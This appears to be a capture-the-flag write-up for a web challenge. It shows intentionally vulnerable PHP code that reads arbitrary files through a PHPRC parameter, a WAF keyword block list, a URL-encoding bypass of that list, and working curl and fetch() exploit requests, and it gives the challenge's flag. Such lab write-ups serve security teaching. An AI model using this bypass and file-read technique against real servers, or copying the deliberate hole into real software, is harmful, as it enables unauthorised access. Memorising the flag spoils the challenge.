# Old But Gold

| Field | Value |
|-------|-------|
| Category | Web |
| Points | ? |

## Description

> Our company just deployed a legacy 2012 internal logistics portal.
> The developers swear it's completely safe. Can you prove them wrong?

**Files:** `src/`

## Solution

### Reconnaissance

1. Visit the homepage — 2012-style corporate dashboard
2. Check `robots.txt`:
   ```
   User-agent: *
   Disallow: /internal/
   ```
3. Accessing `/internal/flag` directly returns `403 Forbidden` (Apache restriction)

### Vulnerability — PHP-CGI `PHPRC` legacy mode

The app has a hidden "legacy" endpoint triggered via the `PHPRC` query parameter:

```php
if (isset($_GET['PHPRC']) && $_GET['PHPRC'] === '/dev/fd/0') {
    parse_str(file_get_contents('php://input'), $legacy_configs);
    if (isset($legacy_configs['auto_prepend_file'])) {
        readfile($legacy_configs['auto_prepend_file']);
    }
}
```

This mimics the real CVE where `PHPRC=/dev/fd/0` allows injecting PHP config via POST body.

### WAF Bypass

A simple WAF blocks keywords including `auto_prepend_file`:

```php
$waf_blocked = ['allow_url_include', 'auto_prepend_file', 'php://', 'data://'];
```

The WAF checks the **raw** request body string. But `parse_str()` **URL-decodes** keys before processing them. URL-encode the first character to bypass:

- `auto_prepend_file` → `%61uto_prepend_file`

### Exploit

```bash
curl -X POST "http://<host>/index.php?PHPRC=/dev/fd/0" \
     -d "%61uto_prepend_file=internal/flag"
```

Response includes:
```html
<!-- Note: Legacy mode activated. Prepending file... -->
CHC{old_but_gold_never_dies}
```

**Browser console version:**
```javascript
fetch('/index.php?PHPRC=/dev/fd/0', {
    method: 'POST',
    body: '%61uto_prepend_file=internal/flag',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'}
}).then(r => r.text()).then(d => document.body.innerHTML = '<pre>' + d + '</pre>');
```

## Flag

`CHC{old_but_gold_never_dies}`
